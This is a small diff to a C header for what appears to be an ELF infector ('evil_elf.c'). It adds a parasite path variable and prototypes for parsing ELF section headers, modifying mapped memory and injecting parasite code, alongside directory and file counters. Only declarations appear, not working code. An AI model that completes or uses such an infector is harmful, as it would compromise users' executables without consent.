@@ -1,4 +1,5 @@
 #pragma once
+#include <elf.h>
 
 
 // Put all the MACROS, function prototypes, globally used variables and constants in this header file
@@ -23,6 +24,7 @@
 extern unsigned long int dir_count;
 extern unsigned long int file_count;
 extern unsigned long int elf_count;
+extern char 			 *parasite_path;
 
 
 typedef struct Node
@@ -56,5 +58,7 @@ static int			IsELF(char *);
 // evil_elf.c
 void				ElfParser(char *);
 int					ParseElfHeader(void *);
-void				ParseSHT(void *);
+void				ParseSHT(void *, char *, Elf64_Off *, uint64_t *);
 void				ParsePHT(void *);
+static void			ModifyMappedMemory(void *);
+static void			InjectParasiteCode(void *, Elf64_Off );
